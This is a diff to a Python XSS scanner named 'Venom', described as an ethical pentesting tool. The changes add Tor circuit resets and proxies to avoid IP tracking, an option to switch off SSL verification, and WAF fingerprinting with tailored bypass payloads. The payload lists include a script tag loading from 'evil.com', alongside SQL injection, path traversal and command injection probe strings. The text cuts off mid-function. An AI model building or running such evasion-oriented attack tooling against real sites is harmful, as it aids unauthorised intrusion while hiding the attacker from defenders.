@@ -11,6 +11,7 @@ import random
 import tempfile
 import socket
 import json
+import signal
 from urllib.parse import urljoin, urlencode, urlparse, parse_qs
 from bs4 import BeautifulSoup
 from requests.adapters import HTTPAdapter
@@ -18,12 +19,14 @@ from requests.packages.urllib3.util.retry import Retry
 import logging
 from typing import Optional, List, Dict
 import html
-from requests.exceptions import RequestException
+from requests.exceptions import RequestException, ConnectionError
 from concurrent.futures import ThreadPoolExecutor
 from sklearn.feature_extraction.text import TfidfVectorizer
 from sklearn.metrics.pairwise import cosine_similarity
 import socks
 import socket as sock
+import stem.control
+import dns.resolver
 
 # Setup logging
 log_file = "venom_anonymous.log"
@@ -95,14 +98,15 @@ def get_banner_and_features() -> str:
         f"{WHITE}{BOLD}Subdomain scanning from text file support{RESET}",
         f"{WHITE}{BOLD}Comprehensive parameter testing for XSS{RESET}",
         f"{WHITE}{BOLD}Enhanced endpoint discovery and crawling{RESET}",
-        f"{WHITE}{BOLD}Anonymous operation mode with Tor support{RESET}"
+        f"{WHITE}{BOLD}Anonymous operation mode with Tor or proxy support{RESET}",
+        f"{WHITE}{BOLD}IP anonymization to prevent tracking during scans{RESET}"
     ]
     return banner + "\n".join(f"{GREEN}●{RESET} {feature}" for feature in features) + "\n"
 
 def parse_args() -> argparse.Namespace:
     banner_and_features = get_banner_and_features()
     description = f"""{banner_and_features}
-Venom Advanced XSS Scanner is a tool for ethical penetration testers to detect XSS vulnerabilities anonymously. Version 5.48 supports over 8000 payloads, extended event handlers, AI-driven WAF/403 bypass, subdomain scanning, and comprehensive parameter testing.
+Venom Advanced XSS Scanner is a tool for ethical penetration testers to detect XSS vulnerabilities anonymously. Version 5.48 supports over 8000 payloads, extended event handlers, AI-driven WAF/403 bypass, subdomain scanning, comprehensive parameter testing, and enhanced anonymity features to prevent IP tracking.
 
 Usage:
   python3 venom.py <url> --scan-xss [options]
@@ -110,10 +114,10 @@ Usage:
 Examples:
   python3 venom.py http://target.com --scan-xss --anonymous --use-tor -w 5 --ai-assist --subdomains subdomains.txt
     - Anonymous scan with Tor, AI optimization, and subdomain list.
-  python3 venom.py http://example.com --scan-xss --stealth --use-403-bypass --log-output --all-params
-    - Stealth mode with 403 bypass, live logging, and all parameter testing.
-  python3 venom.py http://test.com --scan-xss --extended-events --extra-params "email,id,search" --ai-platform xai-grok --ai-key YOUR_API_KEY
-    - Advanced scan with extended events, extra parameters, and AI assistance via xAI Grok.
+  python3 venom.py http://example.com --scan-xss --stealth --use-403-bypass --log-output --all-params --proxy socks5://localhost:9050
+    - Stealth mode with 403 bypass, live logging, all parameter testing, and SOCKS5 proxy.
+  python3 venom.py http://test.com --scan-xss --extended-events --extra-params "email,id,search" --ai-platform xai-grok --ai-key YOUR_API_KEY --anonymous --disable-ssl-verify
+    - Advanced scan with extended events, extra parameters, AI assistance via xAI Grok, and SSL verification disabled for anonymity.
 """
     
     parser = argparse.ArgumentParser(description=description, formatter_class=argparse.RawDescriptionHelpFormatter)
@@ -124,7 +128,7 @@ Examples:
     parser.add_argument("--all-params", action="store_true", help="Ensure all discovered parameters are tested for XSS.")
     parser.add_argument("--payloads-dir", default="/usr/local/bin/payloads/", help="Directory with custom payload files (default: /usr/local/bin/payloads/).")
     parser.add_argument("--payload-file", type=str, help="Specific payload file to use instead of directory.")
-    parser.add_argument("--timeout", type=int, default=30, help="HTTP request timeout in seconds (default: 30).")
+    parser.add_argument("--timeout", type=int, default=10, help="HTTP request timeout in seconds (default: 10).")
     parser.add_argument("--verbose", action="store_true", help="Enable detailed logging.")
     parser.add_argument("--stealth", action="store_true", help="Enable stealth mode: 2 workers, 5-15s delays.")
     parser.add_argument("--min-delay", type=float, help="Min delay between requests (default: 0.1 or 5 in stealth).")
@@ -139,8 +143,10 @@ Examples:
     parser.add_argument("--use-403-bypass", action="store_true", help="Prioritize 403 bypass payloads from 403bypass.txt.")
     parser.add_argument("--simulate-403", action="store_true", help="Simulate a 403 response to test bypass payloads.")
     parser.add_argument("--no-live-status", action="store_true", help="Disable live status updates.")
-    parser.add_argument("--anonymous", action="store_true", help="Run in anonymous mode (no identifiable data).")
+    parser.add_argument("--anonymous", action="store_true", help="Run in anonymous mode: hide identifiable data and enforce IP anonymization via Tor/proxy.")
     parser.add_argument("--use-tor", action="store_true", help="Route traffic through Tor (requires Tor on port 9050).")
+    parser.add_argument("--proxy", type=str, help="Use a proxy (e.g., 'socks5://localhost:9050' or 'http://proxy:port').")
+    parser.add_argument("--disable-ssl-verify", action="store_true", help="Disable SSL certificate verification for anonymity (use with caution).")
     parser.add_argument("--ai-assist", action="store_true", help="Enable AI-driven payload optimization and WAF/403 bypass.")
     parser.add_argument("--ai-key", type=str, help="API key for external AI platform (required if --ai-platform is used).")
     parser.add_argument("--ai-platform", type=str, choices=['xai-grok', 'openai-gpt3', 'google-gemini'],
@@ -189,10 +195,16 @@ Examples:
     if args.ai_platform and not args.ai_key:
         print(f"{RED}[!] --ai-platform requires --ai-key. Exiting.{RESET}")
         sys.exit(1)
-    if args.anonymous:
-        print(f"{GREEN}[+] Anonymous mode enabled: No identifiable data will be exposed{RESET}")
+    if args.anonymous and not (args.use_tor or args.proxy):
+        print(f"{RED}[!] --anonymous requires --use-tor or --proxy for IP anonymization. Exiting.{RESET}")
+        sys.exit(1)
+    if args.use_tor and args.proxy:
+        print(f"{RED}[!] Cannot use both --use-tor and --proxy. Choose one. Exiting.{RESET}")
+        sys.exit(1)
     if args.use_tor:
         print(f"{GREEN}[+] Tor routing enabled (ensure Tor service is running on port 9050){RESET}")
+    if args.proxy:
+        print(f"{GREEN}[+] Proxy enabled: {args.proxy}{RESET}")
     if args.ai_assist:
         print(f"{GREEN}[+] AI assistance enabled{RESET}")
     if args.extended_events:
@@ -204,6 +216,10 @@ Examples:
         print(f"{GREEN}[+] Subdomain scanning enabled with file: {args.subdomains}{RESET}")
     if args.all_params:
         print(f"{GREEN}[+] All parameters will be tested for XSS{RESET}")
+    if args.disable_ssl_verify:
+        print(f"{YELLOW}[!] SSL verification disabled for anonymity. Use with caution.{RESET}")
+    if args.anonymous:
+        print(f"{GREEN}[+] Anonymous mode enabled: No identifiable data will be exposed{RESET}")
     
     setup_logging(args.verbose, args.log_output, args.anonymous)
     return args
@@ -249,6 +265,29 @@ def setup_tor_proxy():
     sock.socket = socks.socksocket
     logging.info("Tor proxy configured (SOCKS5 localhost:9050)")
 
+def setup_custom_proxy(proxy_url: str):
+    parsed = urlparse(proxy_url)
+    if parsed.scheme == "socks5":
+        socks.set_default_proxy(socks.SOCKS5, parsed.hostname, parsed.port or 9050)
+        sock.socket = socks.socksocket
+        logging.info(f"SOCKS5 proxy configured: {proxy_url}")
+    elif parsed.scheme == "http":
+        proxies = {"http": proxy_url, "https": proxy_url}
+        logging.info(f"HTTP proxy configured: {proxy_url}")
+        return proxies
+    else:
+        raise ValueError(f"Unsupported proxy scheme: {parsed.scheme}. Use 'socks5://' or 'http://'.")
+
+def reset_tor_circuit():
+    try:
+        with stem.control.Controller.from_port(port=9051) as controller:
+            controller.authenticate()
+            controller.signal(stem.Signal.NEWNYM)
+            logging.info("Tor circuit reset")
+            time.sleep(2)
+    except Exception as e:
+        logging.error(f"Failed to reset Tor circuit: {e}")
+
 class AIAssistant:
     def __init__(self, payloads: List[str], api_key: Optional[str] = None, platform: Optional[str] = None, extended_events: bool = False):
         self.payloads = payloads
@@ -272,12 +311,22 @@ class AIAssistant:
         }
         return endpoints.get(self.platform, "https://api.xai.com/v1/completions")
 
-    def suggest_payloads(self, response: Optional[str] = None, status_code: int = 200, waf_detected: bool = False) -> List[str]:
+    def suggest_payloads(self, response: Optional[str] = None, status_code: int = 200, waf_detected: bool = False, waf_type: str = "Unknown") -> List[str]:
         executable_payloads = [p for p in self.payloads if any(x in p.lower() for x in ['alert(', 'on', 'confirm(', 'javascript:'])]
         other_payloads = [p for p in self.payloads if p not in executable_payloads]
         
-        if waf_detected and not response:
-            bypass_payloads = [p for p in self.payloads if any(x in p.lower() for x in ['../', '//', '/*', '<!--'])]
+        if waf_detected:
+            bypass_payloads = [
+                "<scr"+"ipt>alert('xss')</script>",
+                "%253Cscript%253Ealert('xss')%253C/script%253E",
+                "<script>eval(atob('YWxlcnQoJ3hzcycp'))</script>"
+            ]
+            if waf_type == "Cloudflare":
+                bypass_payloads.append("<script src=//evil.com></script>")
+            elif waf_type == "AWS WAF":
+                bypass_payloads.append("<input onpointerover=alert('xss')>")
+            elif waf_type == "ModSecurity":
+                bypass_payloads.append("<script>/*foo*/alert('xss')/*bar*/</script>")
             return bypass_payloads + executable_payloads[:20]
         
         if not response:
@@ -321,31 +370,52 @@ class AIAssistant:
                 self.success_history[payload]["context"] = context
 
 class PayloadGenerator:
-    def __init__(self, payloads_dir: str, payload_file: Optional[str] = None, bypass_needed: bool = False, use_403_bypass: bool = False, stealth: bool = False, extended_events: bool = False):
+    def __init__(self, payloads_dir: str, payload_file: Optional[str] = None, bypass_needed: bool = False, 
+                 use_403_bypass: bool = False, stealth: bool = False, extended_events: bool = False, waf_type: str = "Unknown"):
         self.payloads_dir = payloads_dir
         self.payload_file = payload_file
         self.bypass_needed = bypass_needed
         self.use_403_bypass = use_403_bypass
         self.stealth = stealth
         self.extended_events = extended_events
+        self.waf_type = waf_type
         self.payloads = self.load_payloads()
         self.previous_success = []
 
     def load_payloads(self) -> List[str]:
         default_payloads = [
-            "<script>alert('test')</script>",
-            "<img src=x onerror=alert('test')>",
-            "<svg onload=alert('test')>",
-            "javascript:alert('test')",
-            "<div onmouseover=alert('test')>Hover</div>",
-            "<button onclick=alert('test')>Click</button>"
+            "<script>alert('xss')</script>",
+            "<img src=x onerror=alert('xss')>",
+            "javascript:alert('xss')"
         ]
+        bypass_payloads = {
+            "Cloudflare": [
+                "%253Cscript%253Ealert('xss')%253C/script%253E",
+                "<script src=//evil.com></script>",
+                "<svg onload=alert('xss')>"
+            ],
+            "AWS WAF": [
+                "<input onpointerover=alert('xss')>",
+                "<div onerror=alert('xss') src=x>",
+                "<script>alert('xss')</script>"
+            ],
+            "ModSecurity": [
+                "<scr"+"ipt>alert('xss')</script>",
+                "<script>/*foo*/alert('xss')/*bar*/</script>",
+                "<img src=x onerror=alert('xss')>"
+            ]
+        }
         stealth_payloads = [
             "<script>alert('xss')</script>",
-            "<img src=x onerror=alert(1)>"
+            "<img src=x onerror=alert('xss')>"
         ]
-        
-        payloads = set()
+
+        payloads = set(default_payloads if not self.stealth else stealth_payloads)
+        if self.bypass_needed or self.use_403_bypass:
+            waf_specific = bypass_payloads.get(self.waf_type, [])
+            payloads.update(waf_specific)
+            logging.info(f"Loaded WAF-specific bypass payloads for {self.waf_type}: {len(waf_specific)}")
+
         if self.payload_file:
             file_path = sanitize_path(self.payload_file)
             try:
@@ -356,19 +426,17 @@ class PayloadGenerator:
                         logging.info(f"Loaded {len(file_payloads)} payloads from {file_path}")
                 else:
                     logging.error(f"Payload file {file_path} not found or not readable; using defaults")
-                    payloads = set(stealth_payloads if self.stealth else default_payloads)
             except Exception as e:
                 logging.error(f"Error loading {file_path}: {e}; using defaults")
-                payloads = set(stealth_payloads if self.stealth else default_payloads)
         else:
             if not os.path.exists(self.payloads_dir) or not os.access(self.payloads_dir, os.R_OK):
                 logging.error(f"Payloads directory {self.payloads_dir} not found or not readable; using defaults")
-                return stealth_payloads if self.stealth else default_payloads
+                return list(payloads)
 
             all_files = [f for f in os.listdir(self.payloads_dir) if f.endswith('.txt')]
             if not all_files:
                 logging.warning(f"No .txt files found in {self.payloads_dir}; using defaults")
-                return stealth_payloads if self.stealth else default_payloads
+                return list(payloads)
 
             loaded_any = False
             if self.use_403_bypass or self.bypass_needed:
@@ -381,8 +449,6 @@ class PayloadGenerator:
                             payloads.update(file_payloads)
                             logging.info(f"Loaded {len(file_payloads)} payloads from {file_path} for bypass")
                             loaded_any = True
-                    else:
-                        logging.warning(f"Bypass file {file_path} not found or not readable")
                 except Exception as e:
                     logging.error(f"Error loading {file_path}: {e}")
 
@@ -395,27 +461,36 @@ class PayloadGenerator:
                             payloads.update(file_payloads)
                             logging.info(f"Loaded {len(file_payloads)} payloads from {file_path}")
                             loaded_any = True
-                    else:
-                        logging.warning(f"Payload file {file_path} not found or not readable")
                 except Exception as e:
                     logging.error(f"Error loading {file_path}: {e}")
 
             if not loaded_any:
                 logging.error(f"No payload files loaded from {self.payloads_dir}; using defaults")
-                return stealth_payloads if self.stealth else default_payloads
 
-        unique_payloads = list(payloads)
         if self.extended_events:
-            unique_payloads.extend([
-                "<img src=x onmouseover=alert('test')>",
-                "<div onclick=alert('test')>Click me</div>",
-                "<input type=text onfocus=alert('test')>"
+            payloads.update([
+                "<img src=x onmouseover=alert('xss')>",
+                "<div onclick=alert('xss')>Click</div>",
+                "<input onfocus=alert('xss')>"
             ])
-        logging.debug(f"Total unique payloads loaded: {len(unique_payloads)}")
-        return unique_payloads if unique_payloads else (stealth_payloads if self.stealth else default_payloads)
+        logging.debug(f"Total unique payloads loaded: {len(payloads)}")
+        return list(payloads)
 
     def generate(self) -> List[str]:
+        if self.bypass_needed:
+            return self.obfuscate_payloads(self.payloads)
         return self.payloads
+
+    def obfuscate_payloads(self, payloads: List[str]) -> List[str]:
+        obfuscated = []
+        for p in payloads:
+            obfuscated.extend([
+                p.upper(),
+                html.escape(p),
+                f"/*{random.randint(1,100)}*/{p}/*{random.randint(1,100)}*/",
+                urlencode({'': p})[1:]
+            ])
+        return list(set(obfuscated))
 
     def update_success(self, payload: str):
         self.previous_success.append(payload)
@@ -424,8 +499,11 @@ class Venom:
     def __init__(self, args: argparse.Namespace):
         self.args = args
         self.session = requests.Session()
-        self.session.mount('http://', HTTPAdapter(max_retries=Retry(total=10, backoff_factor=2), pool_maxsize=10))
-        self.session.mount('https://', HTTPAdapter(max_retries=Retry(total=10, backoff_factor=2), pool_maxsize=10))
+        resolver = dns.resolver.Resolver()
+        resolver.nameservers = ['8.8.8.8', '8.8.4.4', '1.1.1.1']
+        retry_strategy = Retry(total=10, backoff_factor=2, status_forcelist=[429, 500, 502, 503, 504], allowed_methods=["HEAD", "GET", "POST"])
+        self.session.mount('http://', HTTPAdapter(max_retries=retry_strategy, pool_maxsize=20))
+        self.session.mount('https://', HTTPAdapter(max_retries=retry_strategy, pool_maxsize=20))
         self.session.headers.update({
             'User-Agent': random.choice([
                 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/91.0.4472.124 Safari/537.36',
@@ -436,10 +514,38 @@ class Venom:
             'Accept-Language': 'en-US,en;q=0.5'
         })
 
+        # Anonymity setup
+        self.proxies = None
         if args.use_tor:
             setup_tor_proxy()
+            try:
+                tor_response = self.session.get("https://check.torproject.org", timeout=5)
+                if "Congratulations" not in tor_response.text:
+                    logging.error("Tor connection not verified")
+                    print(f"{RED}[!] Tor connection not working. Check Tor service on port 9050.{RESET}")
+                    sys.exit(1)
+                logging.info("Tor connection verified")
+            except RequestException as e:
+                logging.error(f"Failed to verify Tor: {e}")
+                print(f"{RED}[!] Unable to verify Tor connection: {e}. Exiting.{RESET}")
+                sys.exit(1)
+        elif args.proxy:
+            self.proxies = setup_custom_proxy(args.proxy)
+            self.session.proxies.update(self.proxies)
+
         if args.anonymous:
             self.session.headers.pop('Referer', None)
+            self.session.headers.pop('User-Agent', None)
+            self.session.headers['User-Agent'] = random.choice([
+                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/91.0.4472.124 Safari/537.36',
+                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15',
+                'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko)'
+            ])
+
+        if args.disable_ssl_verify:
+            import urllib3
+            urllib3.disable_warnings()
+            self.session.verify = False
 
         self.update_headers(args.headers)
         self.post_data = args.post_data if hasattr(args, 'post_data') else {'test': 'default'}
@@ -467,20 +573,38 @@ class Venom:
         self.running = True
         self.domain = urlparse(args.url).netloc
         self.waf_ips_status = "Unknown"
+        self.waf_type = "Unknown"
         self.bypass_performed = False
         self.use_403_bypass = args.use_403_bypass
         self.is_waf_detected = False
         self.active_params = []
         self.extra_params = args.extra_params.split(',') if args.extra_params else ['email', 'id', 'search', 'name', 'username', 'message']
         self.subdomains = self.load_subdomains() if args.subdomains else []
+        self.rate_limit_detected = False
+        self.dns_failure_count = 0
+        self.dns_cache = {}
 
         self.initial_waf_ips_check()
-        self.payload_generator = PayloadGenerator(self.args.payloads_dir, self.args.payload_file, self.bypass_performed, self.use_403_bypass, self.args.stealth, self.args.extended_events)
+        self.payload_generator = PayloadGenerator(
+            self.args.payloads_dir, self.args.payload_file, self.bypass_performed, 
+            self.use_403_bypass, self.args.stealth, self.args.extended_events, self.waf_type
+        )
         self.payloads = self.payload_generator.generate()
-        self.ai_assistant = AIAssistant(self.payloads, self.args.ai_key, self.args.ai_platform, self.args.extended_events) if args.ai_assist else None
+        self.ai_assistant = AIAssistant(
+            self.payloads, self.args.ai_key, self.args.ai_platform, self.args.extended_events
+        ) if args.ai_assist else None
         if self.ai_assistant:
-            self.payloads = self.ai_assistant.suggest_payloads(waf_detected=self.is_waf_detected)
+            self.payloads = self.ai_assistant.suggest_payloads(waf_detected=self.is_waf_detected, waf_type=self.waf_type)
         self.total_payloads = len(self.payloads)
+
+        # Signal handler for graceful exit
+        signal.signal(signal.SIGINT, self.signal_handler)
+
+    def signal_handler(self, sig, frame):
+        print(f"{YELLOW}[!] Scan interrupted by user. Generating report...{RESET}")
+        self.running = False
+        self.generate_report()
+        sys.exit(0)
 
     def load_subdomains(self) -> List[str]:
         subdomains = []
@@ -510,30 +634,118 @@ class Venom:
             except ValueError:
                 logging.warning(f"Invalid header format")
 
-    def initial_waf_ips_check(self):
-        try:
-            test_payloads = ["<script>alert('test')</script>", "1' OR '1'='1"]
-            for payload in test_payloads:
-                response = self.session.get(self.args.url + "?test=" + urlencode({'': payload})[1:], timeout=self.args.timeout, verify=True)
-                if response.status_code in [403, 429] or 'blocked' in response.text.lower():
-                    self.waf_ips_status = "WAF detected"
-                    self.is_waf_detected = True
-                    break
-            if not self.is_waf_detected:
-                self.waf_ips_status = "No WAF/IPS detected"
-            logging.info(f"WAF/IPS check result: {self.waf_ips_status}")
-        except RequestException as e:
-            self.waf_ips_status = "Check failed"
-            logging.error(f"WAF/IPS check failed: {e}")
+    def resolve_with_fallback(self, hostname: str) -> Optional[str]:
+        if hostname in self.dns_cache:
+            return self.dns_cache[hostname]
+        
+        retries = 5
+        for attempt in range(retries):
+            try:
+                ip = socket.gethostbyname(hostname)
+                self.dns_cache[hostname] = ip
+                logging.debug(f"Resolved {hostname} with system DNS: {ip}")
+                return ip
+            except socket.gaierror as e:
+                logging.warning(f"DNS resolution failed for {hostname} with system DNS (attempt {attempt + 1}/{retries}): {e}")
+                resolver = dns.resolver.Resolver()
+                resolver.nameservers = ['8.8.8.8', '8.8.4.4', '1.1.1.1']
+                try:
+                    answer = resolver.resolve(hostname, 'A')
+                    ip = answer[0].address
+                    self.dns_cache[hostname] = ip
+                    logging.info(f"Resolved {hostname} with fallback DNS: {ip}")
+                    return ip
+                except Exception as e:
+                    logging.error(f"Failed to resolve {hostname} with fallback DNS (attempt {attempt + 1}/{retries}): {e}")
+                    if self.args.use_tor:
+                        reset_tor_circuit()
+                    time.sleep(2)
+        logging.error(f"All DNS resolution attempts failed for {hostname}")
+        return None
 
     def check_connection(self, url: str) -> bool:
+        retries = 10
+        for attempt in range(retries):
+            try:
+                response = self.session.head(url, timeout=self.args.timeout, allow_redirects=True)
+                logging.debug(f"Connection check for {url}: {response.status_code}")
+                self.dns_failure_count = 0
+                return response.status_code < 400
+            except ConnectionError as e:
+                logging.error(f"Connection refused for {url}: {e}")
+                print(f"{RED}[!] Connection refused for {url}: {e}. Retrying ({attempt + 1}/{retries})...{RESET}")
+            except RequestException as e:
+                if "NameResolutionError" in str(e):
+                    self.dns_failure_count += 1
+                    logging.error(f"DNS resolution failed for {url}: {e}")
+                    if self.dns_failure_count > 5:
+                        print(f"{YELLOW}[!] Multiple DNS resolution failures ({self.dns_failure_count}). Resetting Tor circuit and retrying ({attempt + 1}/{retries})...{RESET}")
+                        if self.args.use_tor:
+                            reset_tor_circuit()
+                else:
+                    logging.error(f"Connection check failed for {url}: {e}")
+                time.sleep(2)
+        print(f"{RED}[!] Failed to connect to {url} after {retries} attempts.{RESET}")
+        return False
+
+    def initial_waf_ips_check(self):
+        waf_signatures = {
+            "Cloudflare": ["cloudflare", "CF-RAY", "cf-cache-status"],
+            "AWS WAF": ["X-Amz-Cf-Id", "X-Amz-Cf-Pop"],
+            "ModSecurity": ["Mod_Security", "X-Mod-Security"],
+            "Imperva": ["X-Iinfo", "X-Cdn: Imperva"],
+            "Akamai": ["X-Akamai-Transformed", "AkamaiGHost"]
+        }
+        test_payloads = [
+            "<script>alert('xss')</script>",
+            "1; DROP TABLE users--",
+            "../../etc/passwd",
+            "; ls -la"
+        ]
+        self.waf_ips_status = "No WAF/IPS detected"
+        self.is_waf_detected = False
+        self.waf_type = "Unknown"
+
         try:
-            response = self.session.head(url, timeout=self.args.timeout, allow_redirects=True)
-            logging.debug(f"Connection check for {url}: {response.status_code}")
-            return response.status_code < 400
-        except RequestException as e:
-            logging.error(f"Connection check failed for {url}: {e}")
-            return False
+            for payload in test_payloads:
+                url = self.args.url + "?test=" + urlencode({'': payload})[1:]
+                response = self.session.get(url, timeout=self.args.timeout)
+                headers = response.headers
+                content = response.text.lower()
+
+                for waf, signatures in waf_signatures.items():
+                    if any(sig.lower() in headers.get(k, "").lower() for k in headers for sig in signatures):
+                        self.waf_ips_status = f"WAF detected: {waf}"
+                        self.is_waf_detected = True
+                        self.waf_type = waf
+                        logging.info(f"WAF detected: {waf}")
+                        break
+
+                if response.status_code in [403, 429] or any(kw in content for kw in ["blocked", "access denied", "forbidden", "request blocked"]):
+                    self.waf_ips_status = "WAF/IPS detected (status/content)"
+                    self.is_waf_detected = True
+                    self.waf_type = "Generic" if self.waf_type == "Unknown" else self.waf_type
+
+                if "<script" in content and any(kw in content for kw in ["eval", "setTimeout", "challenge"]):
+                    self.waf_ips_status = "WAF detected: JS Challenge"
+                    self.is_waf_detected = True
+                    self.waf_type = "JS-Based"
+
+            for _ in range(5):
+                response = self.session.get(self.args.url, timeout=self.args.timeout)
+                if response.status_code == 429:
+                    self.waf_ips_status = "WAF/IPS detected: Rate Limiting"
+                    self.is_waf_detected = True
+                    self.rate_limit_detected = True
+                    self.waf_type = "Rate-Limiter"
+                    break
+                time.sleep(0.2)
+
+            logging.info(f"WAF/IPS check result: {self.waf_ips_status} (Type: {self.waf_type})")
+        except Exception as e:
+            logging.error(f"Unexpected error in WAF check: {e}")
+            self.waf_ips_status = "Check failed"
+            print(f"{RED}[!] WAF/IPS check failed unexpectedly: {e}. Proceeding with scan attempt.{RESET}")
 
     def crawl_links(self, base_url: str) -> List[str]:
         urls = set([base_url])
@@ -542,7 +754,7 @@ class Venom:
             return list(urls)
         
         try:
-            response = self.session.get(base_url, timeout=self.args.timeout, verify=True)
+            response = self.session.get(base_url, timeout=self.args.timeout)
             soup = BeautifulSoup(response.text, 'html.parser')
             for link in soup.find_all('a', href=True):
                 absolute_url = urljoin(base_url, link['href'])
@@ -588,7 +800,7 @@ class Venom:
                 for attr in tag.attrs:
                     if attr in ['name', 'id', 'data-name', 'class']:
                         value = tag[attr]
-                        if isinstance(value, list):  # Handle multi-valued attributes like 'class'
+                        if isinstance(value, list):
                             params.update(str(v) for v in value)
                         else:
                             params.add(str(value))
@@ -599,25 +811,53 @@ class Venom:
         return self.active_params
 
     def inject_payload(self, url: str, method: str, payload: str, param: str = None, data: Dict[str, str] = None) -> tuple[Optional[str], int]:
-        try:
-            if method.lower() == 'get':
-                target_url = url
-                if param:
-                    parsed = urlparse(url)
-                    query = parse_qs(parsed.query)
-                    query[param] = payload
-                    target_url = parsed._replace(query=urlencode(query, doseq=True)).geturl()
-                response = self.session.get(target_url, timeout=self.args.timeout, verify=True)
-            else:
-                data = data.copy() if data else self.post_data.copy()
-                if param:
-                    data[param] = payload
-                response = self.session.post(url, data=data, timeout=self.args.timeout, verify=True)
-            logging.debug(f"Injected payload {payload} into {url} ({method}) - Status: {response.status_code}")
-            return response.text, response.status_code
-        except RequestException as e:
-            logging.error(f"Payload injection failed for {url}: {e}")
-            return None, 0
+        retries = 10
+        response_text = None
+        status_code = 0
+        for attempt in range(retries):
+            try:
+                if method.lower() == 'get':
+                    target_url = url
+                    if param:
+                        parsed = urlparse(url)
+                        query = parse_qs(parsed.query)
+                        query[param] = payload
+                        target_url = parsed._replace(query=urlencode(query, doseq=True)).geturl()
+                    response = self.session.get(target_url, timeout=self.args.timeout)
+                else:
+                    data = data.copy() if data else self.post_data.copy()
+                    if param:
+                        data[param] = payload
+                    response = self.session.post(url, data=data, timeout=self.args.timeout)
+                logging.debug(f"Injected payload {payload} into {url} ({method}) - Status: {response.status_code}")
+                if response.status_code in [403, 429] and not self.is_waf_detected:
+                    self.is_waf_detected = True
+                    self.waf_ips_status = f"WAF/IPS detected during scan (status: {response.status_code})"
+                    self.waf_type = "Dynamic Detection"
+                    logging.info(f"WAF/IPS detected during scan: {self.waf_ips_status}")
+                    if self.use_403_bypass:
+                        self.bypass_performed = True
+                        self.payloads = self.payload_generator.generate()
+                        logging.info("Switched to 403 bypass payloads")
+                    elif self.ai_assistant:
+                        self.payloads = self.ai_assistant.suggest_payloads(response.text, response.status_code, True, self.waf_type)
+                response_text = response.text
+                status_code = response.status_code
+                self.dns_failure_count = 0
+                return response_text, status_code
+            except RequestException as e:
+                if "NameResolutionError" in str(e) or "RemoteDisconnected" in str(e):
+                    self.dns_failure_count += 1
+                    logging.error(f"Payload injection failed for {url}: {e}")
+                    if self.dns_failure_count > 5:
+                        print(f"{YELLOW}[!] Multiple DNS resolution failures ({self.dns_failure_count}). Resetting Tor circuit and retrying ({attempt + 1}/{retries})...{RESET}")
+                        if self.args.use_tor:
+                            reset_tor_circuit()
+                else:
+                    logging.error(f"Payload injection failed for {url}: {e}")
+                time.sleep(2)
+        logging.error(f"Payload injection failed for {url} after {retries} attempts")
+        return response_text, status_code
 
     def scan_url(self, url: str, method: str, data: Dict[str, str]):
         if url in self.visited_urls:
@@ -626,13 +866,13 @@ class Venom:
         self.visited_urls.add(url)
         
         try:
-            response = self.session.get(url, timeout=self.args.timeout, verify=True) if method.lower() == 'get' else \
-                      self.session.post(url, data=data, timeout=self.args.timeout, verify=True)
+            response = self.session.get(url, timeout=self.args.timeout) if method.lower() == 'get' else \
+                      self.session.post(url, data=data, timeout=self.args.timeout)
             params = self.extract_params(url, response.text)
             if not params and method.lower() == 'post':
                 params = list(data.keys())
             
-            payloads = self.ai_assistant.suggest_payloads(response.text, response.status_code, self.is_waf_detected) if self.ai_assistant else self.payload_generator.generate()
+            payloads = self.ai_assistant.suggest_payloads(response.text, response.status_code, self.is_waf_detected, self.waf_type) if self.ai_assistant else self.payload_generator.generate()
             
             def test_payload(param, payload):
                 self.current_payload = payload
@@ -642,44 +882,71 @@ class Venom:
                 resp_text, status = self.inject_payload(url, method, payload, param, data)
                 test_count = self.total_tests.increment()
                 
+                if status == 429 and not self.rate_limit_detected:
+                    self.rate_limit_detected = True
+                    self.args.min_delay *= 1.5
+                    self.args.max_delay *= 1.5
+                    logging.info(f"Rate limit detected, increased delays to {self.args.min_delay}-{self.args.max_delay}s")
+                    if self.args.use_tor:
+                        reset_tor_circuit()
+
                 if resp_text and status == 200:
                     soup = BeautifulSoup(resp_text, 'html.parser')
-                    if is_reflected(payload, resp_text):
+                    reflected, context = is_reflected(payload, resp_text, soup)
+                    if reflected:
+                        logging.debug(f"Payload {payload} reflected in {url} - Context: {context}")
+                        start_idx = resp_text.find(payload) if payload in resp_text else -1
+                        snippet = resp_text[max(0, start_idx-50):start_idx+len(payload)+50] if start_idx != -1 else "Not found in full text"
                         vuln = {
                             'url': url,
                             'full_url': url + '?' + urlencode({param: payload}) if method.lower() == 'get' else url,
                             'method': method.upper(),
                             'param': param,
                             'payload': payload,
-                            'type': "Reflected XSS"
+                            'type': "Reflected XSS",
+                            'context': context,
+                            'response_snippet': snippet,
+                            'status_code': status
                         }
                         with self.lock:
                             self.vulnerabilities.append(vuln)
-                        logging.info(f"Vulnerability found at {url} - Param: {param} - Payload: {payload}")
+                        logging.info(f"Vulnerability found at {url} - Param: {param} - Payload: {payload} - Context: {context}")
                         if self.ai_assistant:
                             self.ai_assistant.record_success(payload, resp_text[:500], status)
                 
                 time.sleep(random.uniform(self.args.min_delay, self.args.max_delay))
 
             with ThreadPoolExecutor(max_workers=min(10, self.args.workers)) as executor:
-                for param in params:
-                    executor.map(lambda p: test_payload(param, p), payloads)
+                futures = [executor.submit(test_payload, param, payload) for param in params for payload in payloads]
+                for future in futures:
+                    try:
+                        future.result()
+                    except Exception as e:
+                        logging.error(f"Payload test failed: {e}")
         
         except RequestException as e:
             logging.error(f"Scan failed for {url}: {e}")
+            print(f"{YELLOW}[!] Skipping {url} due to error: {e}. Continuing with remaining tasks.{RESET}")
 
     def worker(self):
         while self.running:
             try:
-                url, method, data = self.task_queue.get(timeout=1)
+                url, method, data = self.task_queue.get(timeout=5)
                 logging.debug(f"Worker processing: {method} {url}")
                 self.scan_url(url, method, data)
                 self.task_queue.task_done()
+                logging.info(f"Completed task: {method} {url} (Remaining tasks: {self.task_queue.qsize()})")
             except queue.Empty:
-                logging.debug("Task queue empty, worker waiting...")
-                time.sleep(1)
+                logging.debug("Task queue empty, worker exiting")
+                break
             except Exception as e:
                 logging.error(f"Worker error: {e}")
+                try:
+                    self.task_queue.task_done()
+                except ValueError:
